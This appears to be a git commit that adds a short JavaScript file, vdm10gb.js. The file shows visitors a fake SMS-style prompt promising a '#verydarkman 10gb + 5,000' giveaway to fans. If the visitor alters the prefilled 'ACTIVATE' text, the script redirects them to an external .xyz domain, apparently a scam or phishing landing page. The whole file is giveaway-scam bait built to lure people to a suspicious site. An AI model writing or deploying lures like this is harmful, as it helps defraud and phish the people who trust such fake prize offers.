3bf7e07f158e4eb849542f3df500c8b3c266a7b4
bigetijazz30 <bigetijazz30@gmail.com>
2025-05-07 19:59:41 +0100

    Create vdm10gb.js

---
+++ vdm10gb.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 10gb + 5,000'
+password=prompt('SMS : hello dear, You are invited to benefit from #verydarkman 10gb + 5,000, giveaway to all fans as way of saying thank you!!!','ACTIVATE 10gb + 5,000');
+if (password != 'ACTIVATE 10gb + 5,000') {
+location.href='https://www.neworange50go.xyz/vdm-10gb';
+}
